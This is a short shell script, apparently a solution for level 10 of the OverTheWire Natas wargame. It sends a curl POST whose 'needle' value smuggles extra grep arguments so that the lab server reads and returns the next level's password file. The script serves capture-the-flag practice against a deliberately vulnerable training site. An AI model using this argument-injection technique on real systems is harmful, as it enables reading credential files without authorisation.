#!/bin/echo Please source

export natas11pass=$(curl -d "submit&needle=-E '*' /etc/natas_webpass/natas11 #" -X POST -s -u natas10:$natas10pass natas10.natas.labs.overthewire.org | grep -E '^[0-9a-zA-Z]{32}$')
echo natas11: $natas11pass
